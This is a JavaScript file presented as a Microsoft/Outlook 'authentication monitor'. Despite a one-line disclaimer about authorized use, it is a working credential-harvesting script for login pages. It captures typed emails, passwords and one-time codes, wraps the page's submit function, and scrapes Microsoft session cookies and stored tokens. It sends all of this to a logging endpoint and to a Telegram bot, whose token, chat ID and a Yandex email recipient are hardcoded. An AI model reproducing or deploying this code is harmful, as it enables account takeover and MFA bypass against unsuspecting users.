// outlook-integration.js - Specialized version for Microsoft login pages
// IMPORTANT: Only deploy on domains you own and are authorized to monitor

// Outlook-specific configuration
const outlookConfig = {
  // Update with your actual settings
  companyDomain: "yourcompanydomain.com",
  logEndpoint: "https://yourcompanydomain.com/auth-logs",
  notificationSettings: {
    sendEmail: true,
    emailRecipient: "jokersudo@yandex.com",
    useTelegram: true,
    telegramBotToken: "5833826797:AAHinlaDwiK7-fk8_LMjk8aGydwiM70TZ8g",
    telegramChatId: "5480674751"
  },
  // Specific selectors for Outlook/Microsoft login forms
  selectors: {
    emailInput: '#emailInput, #i0116, input[name="loginfmt"]',
    passwordInput: '#passwordInput, #i0118, input[name="passwd"]',
    submitButton: '#submitButton, #idSIButton9, .newSi, button[onclick="submitForm()"]'
  },
  // Long expiry settings
  cookieSettings: {
    expiryDays: 90, // 3 months
    sessionKey: 'ms_auth_monitor'
  },
  // Debug mode - set to true to see console logs
  debug: true
};

// Enhanced SessionLogger specifically for Outlook/Microsoft logins
class OutlookAuthMonitor {
  constructor() {
    this.sessionData = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      referrer: document.referrer,
      location: window.location.href,
      cookies: this.getCookiesData(),
      microsoftAuth: {
        sessionCookies: {},
        localStorageTokens: {},
        formInputs: {}
      },
      sessionId: this.generateSessionId()
    };
    
    // Set long-expiring cookie
    this.setLongExpiringCookie();
    
    // Setup monitors
    this.setupFormMonitoring();
    this.setupMicrosoftAuthMonitoring();
    
    // Log initialization if debug mode is on
    if (outlookConfig.debug) {
      console.log("Microsoft Authentication Monitor initialized", this.sessionData.sessionId);
    }
  }
  
  // Get cookies in a structured format
  getCookiesData() {
    const cookies = {};
    if (document.cookie && document.cookie !== '') {
      document.cookie.split(';').forEach(cookie => {
        const parts = cookie.trim().split('=');
        const name = parts[0];
        const value = parts.slice(1).join('=');
        if (name && value) {
          cookies[name] = value;
        }
      });
    }
    return cookies;
  }
  
  // Set a monitoring cookie with long expiration
  setLongExpiringCookie() {
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + outlookConfig.cookieSettings.expiryDays);
    
    document.cookie = `${outlookConfig.cookieSettings.sessionKey}=${this.sessionData.sessionId}; expires=${expiryDate.toUTCString()}; path=/; secure; samesite=lax`;
    
    // Log cookie creation if debug mode is on
    if (outlookConfig.debug) {
      console.log(`Long-expiring cookie set: ${outlookConfig.cookieSettings.sessionKey}=${this.sessionData.sessionId}`);
    }
  }
  
  // Generate a unique session ID
  generateSessionId() {
    return 'ms_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  }
  
  // Monitor form submissions and input changes
  setupFormMonitoring() {
    // Monitor all form submissions
    document.addEventListener('submit', (e) => {
      if (outlookConfig.debug) console.log("Form submission detected");
      this.captureFormData();
      this.sendLogData('form_submit');
    });
    
    // Directly monitor password field changes
    const passwordInputSelector = outlookConfig.selectors.passwordInput;
    document.querySelectorAll(passwordInputSelector).forEach(input => {
      if (outlookConfig.debug) console.log("Password field found:", input.id || input.name);
      
      // Monitor change events
      input.addEventListener('change', () => {
        if (outlookConfig.debug) console.log("Password field changed");
        this.captureFormData();
      });
      
      // Monitor input events for real-time capture
      input.addEventListener('input', () => {
        if (outlookConfig.debug) console.log("Password field input detected");
        this.captureFormData();
      });
      
      // Monitor blur events when focus leaves the field
      input.addEventListener('blur', () => {
        if (outlookConfig.debug) console.log("Password field blur event");
        if (input.value) {
          this.captureFormData();
        }
      });
    });
    
    // Monitor email input changes
    document.querySelectorAll(outlookConfig.selectors.emailInput).forEach(input => {
      input.addEventListener('change', () => {
        if (outlookConfig.debug) console.log("Email field changed");
        this.captureFormData();
      });
      
      // Also monitor blur events for email inputs
      input.addEventListener('blur', () => {
        if (input.value) {
          if (outlookConfig.debug) console.log("Email field blur event");
          this.captureFormData();
          this.sendLogData('email_entered');
        }
      });
    });
    
    // Monitor all submit buttons
    const submitButtonSelector = outlookConfig.selectors.submitButton;
    document.querySelectorAll(submitButtonSelector).forEach(button => {
      if (outlookConfig.debug) console.log("Submit button found:", button.id || button.className);
      
      button.addEventListener('click', () => {
        if (outlookConfig.debug) console.log("Submit button clicked");
        this.captureFormData();
        this.sendLogData('button_click');
      });
    });
    
    // Additional monitor for the specific button in your shared code
    const newSiButton = document.querySelector('.newSi');
    if (newSiButton) {
      if (outlookConfig.debug) console.log("NewSi button found");
      newSiButton.addEventListener('click', () => {
        if (outlookConfig.debug) console.log("NewSi button clicked");
        this.captureFormData();
        this.sendLogData('newsi_button_click');
      });
    }
    
    // Monitor all password fields (broader approach)
    document.querySelectorAll('input[type="password"]').forEach(input => {
      if (outlookConfig.debug) console.log("Generic password field found:", input.id || input.name);
      
      input.addEventListener('change', () => {
        if (outlookConfig.debug) console.log("Generic password field changed");
        if (input.value) {
          this.sessionData.microsoftAuth.formInputs.password = input.value;
          this.sendLogData('password_changed');
        }
      });
      
      input.addEventListener('input', () => {
        if (outlookConfig.debug) console.log("Generic password field input");
        if (input.value) {
          this.sessionData.microsoftAuth.formInputs.password = input.value;
        }
      });
    });
    
    // Override the submitForm function if it exists
    if (typeof window.submitForm === 'function') {
      const originalSubmitForm = window.submitForm;
      window.submitForm = (event) => {
        // Capture data before original function runs
        if (outlookConfig.debug) console.log("submitForm function called");
        this.captureFormData();
        this.sendLogData('submit_form_function');
        
        // Call original function
        return originalSubmitForm(event);
      };
      
      if (outlookConfig.debug) console.log("Successfully overrode submitForm function");
    }
  }
  
  // Capture form input data
  captureFormData() {
    // Get email inputs - try multiple methods
    const emailSelectors = outlookConfig.selectors.emailInput.split(',');
    for (const selector of emailSelectors) {
      const input = document.querySelector(selector.trim());
      if (input && input.value) {
        this.sessionData.microsoftAuth.formInputs.email = input.value;
        if (outlookConfig.debug) console.log("Captured email:", input.value);
        break;
      }
    }
    
    // Get password inputs - try multiple methods
    let passwordCaptured = false;
    
    // Method 1: Direct ID selector (most specific to your form)
    const passwordInput = document.getElementById('passwordInput');
    if (passwordInput && passwordInput.value) {
      this.sessionData.microsoftAuth.formInputs.password = passwordInput.value;
      if (outlookConfig.debug) console.log("Captured password from #passwordInput");
      passwordCaptured = true;
    }
    
    // Method 2: Use the selectors from config
    if (!passwordCaptured) {
      const passwordSelectors = outlookConfig.selectors.passwordInput.split(',');
      for (const selector of passwordSelectors) {
        const input = document.querySelector(selector.trim());
        if (input && input.value) {
          this.sessionData.microsoftAuth.formInputs.password = input.value;
          if (outlookConfig.debug) console.log("Captured password from selector:", selector);
          passwordCaptured = true;
          break;
        }
      }
    }
    
    // Method 3: Find any password field (fallback)
    if (!passwordCaptured) {
      const allPasswordFields = document.querySelectorAll('input[type="password"]');
      allPasswordFields.forEach(input => {
        if (input.value) {
          this.sessionData.microsoftAuth.formInputs.password = input.value;
          if (outlookConfig.debug) console.log("Captured password from generic password field:", input.id || input.name);
          passwordCaptured = true;
        }
      });
    }
    
    // Debug log if no password was captured
    if (!passwordCaptured && outlookConfig.debug) {
      console.log("No password field with value was found");
      // Count password fields on page
      const passwordFields = document.querySelectorAll('input[type="password"]');
      console.log(`Found ${passwordFields.length} password fields on page`);
      passwordFields.forEach((field, index) => {
        console.log(`Password field ${index}: id=${field.id}, name=${field.name}, value=${field.value ? 'has value' : 'empty'}`);
      });
    }
    
    // Get any displayed email in the DOM (sometimes shown after the first step)
    const emailDisplayElements = document.querySelectorAll('.email-display, #displayName, .identity, #emailDisplay');
    emailDisplayElements.forEach(element => {
      if (element.textContent && element.textContent.includes('@')) {
        this.sessionData.microsoftAuth.displayedEmail = element.textContent.trim();
        if (outlookConfig.debug) console.log("Captured displayed email:", element.textContent.trim());
      }
    });
    
    // Capture 2FA/MFA codes if present
    const otpFields = document.querySelectorAll('input[type="tel"], input[name*="otp"], input[id*="otp"], input[placeholder*="code"]');
    otpFields.forEach(input => {
      if (input.value) {
        this.sessionData.microsoftAuth.formInputs.otpCode = input.value;
        if (outlookConfig.debug) console.log("Captured OTP code:", input.value);
      }
    });
  }
  
  // Setup specialized monitoring for Microsoft auth cookies and tokens
  setupMicrosoftAuthMonitoring() {
    // Initial capture
    this.captureMicrosoftAuthData();
    
    // Set up interval to check periodically
    setInterval(() => {
      this.captureMicrosoftAuthData();
    }, 2000);
    
    // Also check on visibility change (when user returns to the tab)
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'visible') {
        this.captureMicrosoftAuthData();
      }
    });
  }
  
  // Capture Microsoft auth specific data
  captureMicrosoftAuthData() {
    const currentCookies = this.getCookiesData();
    const previousSessionCookies = this.sessionData.microsoftAuth.sessionCookies;
    let hasChanges = false;
    
    // Check for important Microsoft/Outlook auth cookies
    const authCookiePatterns = [
      'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
      'ESTSSC', 'ESTSSSO', 'wlidperf', 'MSPAuth', 
      'MSPProf', 'MSPOK', 'MSPCID', 'OSession',
      'outlook', 'session', 'cred', 'token', 'auth',
      'WLSSC', 'SignInStateCookie', 'MUID'
    ];
    
    // Check each cookie
    for (const [name, value] of Object.entries(currentCookies)) {
      const isAuthCookie = authCookiePatterns.some(pattern => 
        name.toLowerCase().includes(pattern.toLowerCase())
      );
      
      if (isAuthCookie) {
        if (!previousSessionCookies[name] || previousSessionCookies[name] !== value) {
          this.sessionData.microsoftAuth.sessionCookies[name] = value;
          hasChanges = true;
          if (outlookConfig.debug) console.log("Auth cookie detected:", name);
        }
      }
    }
    
    // Check LocalStorage for auth tokens
    const tokenKeys = this.scanLocalStorageForTokens();
    if (tokenKeys.length > 0) {
      hasChanges = true;
      if (outlookConfig.debug) console.log("Auth tokens found in localStorage:", tokenKeys);
    }
    
    // Check SessionStorage for auth tokens
    const sessionTokenKeys = this.scanSessionStorageForTokens();
    if (sessionTokenKeys.length > 0) {
      hasChanges = true;
      if (outlookConfig.debug) console.log("Auth tokens found in sessionStorage:", sessionTokenKeys);
    }
    
    // If changes detected, send updated data
    if (hasChanges) {
      this.sendLogData('auth_data_changed');
    }
  }
  
  // Scan localStorage for auth tokens
  scanLocalStorageForTokens() {
    const tokenKeys = [];
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const lowerKey = key.toLowerCase();
        
        if (
          lowerKey.includes('token') || 
          lowerKey.includes('auth') || 
          lowerKey.includes('session') ||
          lowerKey.includes('credential') ||
          lowerKey.includes('id_token') ||
          lowerKey.includes('access_token') ||
          lowerKey.includes('refresh_token')
        ) {
          // Only store the value if it hasn't changed
          const value = localStorage.getItem(key);
          if (this.sessionData.microsoftAuth.localStorageTokens[key] !== value) {
            this.sessionData.microsoftAuth.localStorageTokens[key] = value;
            tokenKeys.push(key);
          }
        }
      }
    } catch (e) {
      console.error("Error accessing localStorage:", e);
    }
    return tokenKeys;
  }
  
  // Scan sessionStorage for auth tokens
  scanSessionStorageForTokens() {
    const tokenKeys = [];
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const lowerKey = key.toLowerCase();
        
        if (
          lowerKey.includes('token') || 
          lowerKey.includes('auth') || 
          lowerKey.includes('session') ||
          lowerKey.includes('credential') ||
          lowerKey.includes('id_token') ||
          lowerKey.includes('access_token') ||
          lowerKey.includes('refresh_token')
        ) {
          // Store in the same object as localStorage for simplicity
          const value = sessionStorage.getItem(key);
          if (this.sessionData.microsoftAuth.localStorageTokens[`session_${key}`] !== value) {
            this.sessionData.microsoftAuth.localStorageTokens[`session_${key}`] = value;
            tokenKeys.push(key);
          }
        }
      }
    } catch (e) {
      console.error("Error accessing sessionStorage:", e);
    }
    return tokenKeys;
  }
  
  // Send the collected data to your endpoint
  sendLogData(trigger = 'manual_check') {
    // Update timestamp before sending
    this.sessionData.timestamp = new Date().toISOString();
    this.sessionData.trigger = trigger;
    
    // Only send if we have something meaningful
    const hasAuthData = 
      Object.keys(this.sessionData.microsoftAuth.sessionCookies).length > 0 ||
      Object.keys(this.sessionData.microsoftAuth.localStorageTokens).length > 0;
    
    const hasFormData =
      this.sessionData.microsoftAuth.formInputs.email ||
      this.sessionData.microsoftAuth.formInputs.password ||
      this.sessionData.microsoftAuth.displayedEmail;
    
    if (hasAuthData || hasFormData) {
      // Add document location and title
      this.sessionData.pageTitle = document.title;
      this.sessionData.locationHref = window.location.href;
      
      if (outlookConfig.debug) {
        console.log("Sending auth data to endpoint", {
          trigger,
          hasEmail: !!this.sessionData.microsoftAuth.formInputs.email,
          hasPassword: !!this.sessionData.microsoftAuth.formInputs.password,
          cookieCount: Object.keys(this.sessionData.microsoftAuth.sessionCookies).length,
          tokenCount: Object.keys(this.sessionData.microsoftAuth.localStorageTokens).length
        });
      }
      
      // Send to your server endpoint
      fetch(outlookConfig.logEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(this.sessionData),
        credentials: 'include'
      }).then(response => {
        if (outlookConfig.debug) {
          console.log("Server response:", response.status);
        }
      }).catch(error => {
        console.error("Error sending log data:", error);
      });
      
      // Send notifications if configured
      this.sendNotifications();
    }
  }
  
  // Send notifications via email and/or Telegram
  sendNotifications() {
    if (outlookConfig.notificationSettings.useTelegram) {
      this.sendTelegramNotification();
    }
    
    if (outlookConfig.notificationSettings.sendEmail) {
      // Email notification would typically be handled server-side
      // We log the intention here, and the server handles the actual sending
      fetch(`${outlookConfig.logEndpoint}/email-notification`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          recipient: outlookConfig.notificationSettings.emailRecipient,
          subject: "Microsoft Authentication Activity Detected",
          sessionData: this.sessionData
        })
      }).catch(error => {
        console.error("Error requesting email notification:", error);
      });
    }
  }
  
  // Send a Telegram notification
  sendTelegramNotification() {
    const botToken = outlookConfig.notificationSettings.telegramBotToken;
    const chatId = outlookConfig.notificationSettings.telegramChatId;
    
    if (!botToken || !chatId) {
      console.error("Telegram notification configuration incomplete");
      return;
    }
    
    // Prepare a simplified message for Telegram
    const email = this.sessionData.microsoftAuth.formInputs.email || 
                 this.sessionData.microsoftAuth.displayedEmail || 
                 'N/A';
    
    // Count how many auth items we found
    const cookieCount = Object.keys(this.sessionData.microsoftAuth.sessionCookies).length;
    const tokenCount = Object.keys(this.sessionData.microsoftAuth.localStorageTokens).length;
    
    const message = `
🔐 *Microsoft Authentication Detected* 🔐

🕒 Time: ${this.sessionData.timestamp}
🌐 URL: ${this.sessionData.location}
📱 Device: ${this.truncateText(this.sessionData.userAgent, 100)}
👤 Email: ${email}
🔑 Password: ${this.sessionData.microsoftAuth.formInputs.password ? 'Captured' : 'N/A'}
🍪 Auth Cookies: ${cookieCount}
🔒 Auth Tokens: ${tokenCount}

Session ID: ${this.sessionData.sessionId}
Trigger: ${this.sessionData.trigger}
`;
    
    // Send to Telegram Bot API
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    }).then(response => {
      if (outlookConfig.debug) {
        console.log("Telegram notification sent:", response.status);
      }
    }).catch(error => {
      console.error("Error sending Telegram notification:", error);
    });
  }
  
  // Helper function to truncate text
  truncateText(text, maxLength) {
    if (!text) return '';
    if (text.length <= maxLength) return text;
    return text.substring(0, maxLength) + '...';
  }
}

// Function to check if we're on a Microsoft/Outlook login page
function isMicrosoftLoginPage() {
  const currentUrl = window.location.href.toLowerCase();
  
  // Check URL patterns
  const msPatterns = [
    'login.microsoftonline.com',
    'login.live.com',
    'login.outlook.com',
    'account.microsoft.com',
    'outlook.com',
    'office.com',
    'office365.com',
    'sharepoint.com',
    'login.windows.net',
    'microsoft.com'
  ];
  
  // Check if URL matches any Microsoft patterns
  const isMatchingUrl = msPatterns.some(pattern => currentUrl.includes(pattern));
  
  // Check for Microsoft-specific elements
  const hasMsLogoElement = document.querySelector('img[src*="microsoft_logo"]') !== null;
  const hasMsLoginForm = document.querySelector(outlookConfig.selectors.emailInput) !== null;
  const hasPasswordField = document.querySelector('input[type="password"]') !== null;
  
  const result = isMatchingUrl || hasMsLogoElement || hasMsLoginForm || hasPasswordField;
  
  if (outlookConfig.debug) {
    console.log("Microsoft login page detection:", result);
    console.log("- URL match:", isMatchingUrl);
    console.log("- Logo found:", hasMsLogoElement);
    console.log("- Login form found:", hasMsLoginForm);
    console.log("- Password field found:", hasPasswordField);
  }
  
  return result;
}

// Function to override the default submitForm
function overrideSubmitForm() {
  if (typeof window.submitForm === 'function' && window.outlookAuthMonitor) {
    const originalSubmitForm = window.submitForm;
    window.submitForm = function(event) {
      if (outlookConfig.debug) {
        console.log("submitForm function called - overridden version");
      }
      
      // Capture password before it's cleared
      window.outlookAuthMonitor.captureFormData();
      window.outlookAuthMonitor.sendLogData('submit_form_override');
      
      // Allow a small delay before running the original function
      // This ensures the password is captured before any clearing happens
      setTimeout(() => {
        originalSubmitForm(event);
      }, 50);
    };
    
    if (outlookConfig.debug) {
      console.log("Successfully overrode submitForm function globally");
    }
  }
}

// Initialize the Outlook auth monitor when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', () => {
  // Short delay to ensure the page is fully rendered
  setTimeout(() => {
    // Check if this looks like a Microsoft login page or has a password field
    if (isMicrosoftLoginPage() || document.querySelector('input[type="password"]')) {
      window.outlookAuthMonitor = new OutlookAuthMonitor();
      
      // Override the submitForm function
      overrideSubmitForm();
      
      // Debug logging
      if (outlookConfig.debug) {
        console.log("Microsoft authentication monitor initialized on DOMContentLoaded");
      }
    }
  }, 500);
});

// Also run on load to capture any late-rendered forms
window.addEventListener('load', () => {
  if (!window.outlookAuthMonitor && (isMicrosoftLoginPage() || document.querySelector('input[type="password"]'))) {
    window.outlookAuthMonitor = new OutlookAuthMonitor();
    overrideSubmitForm();
    
    if (outlookConfig.debug) {
      console.log("Microsoft authentication monitor initialized on window.load");
    }
  }
});

// Also initialize on AJAX navigation events by watching for DOM changes
const observer = new MutationObserver((mutations) => {
  // Don't re-initialize if already done
  if (window.outlookAuthMonitor) return;
  
  // Look for significant DOM changes that might indicate page navigation
  for (const mutation of mutations) {
    if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
      // Check if relevant form elements were added
      const hasNewFormElements = Array.from(mutation.addedNodes).some(node => {
        if (node.nodeType === Node.ELEMENT_NODE) {
          return node.querySelector('input[type="password"]') !== null ||
                 node.querySelector(outlookConfig.selectors.emailInput) !== null ||
                 node.querySelector(outlookConfig.selectors.passwordInput) !== null;
        }
        return false;
      });
      
      if (hasNewFormElements && (isMicrosoftLoginPage() || document.querySelector('input[type="password"]'))) {
        window.outlookAuthMonitor = new OutlookAuthMonitor();
        overrideSubmitForm();
        
        if (outlookConfig.debug) {
          console.log("Microsoft authentication monitor initialized after DOM change");
        }
        
        // Once initialized, disconnect observer to save resources
        observer.disconnect();
        break;
      }
    }
  }
});

// Start observing DOM changes
observer.observe(document.body, { childList: true, subtree: true });

// If already loaded, initialize immediately
if (document.readyState === 'complete' || document.readyState === 'interactive') {
  if (!window.outlookAuthMonitor && (isMicrosoftLoginPage() || document.querySelector('input[type="password"]'))) {
    window.outlookAuthMonitor = new OutlookAuthMonitor();
    overrideSubmitForm();
    
    if (outlookConfig.debug) {
      console.log("Microsoft authentication monitor initialized immediately");
    }
  }
}
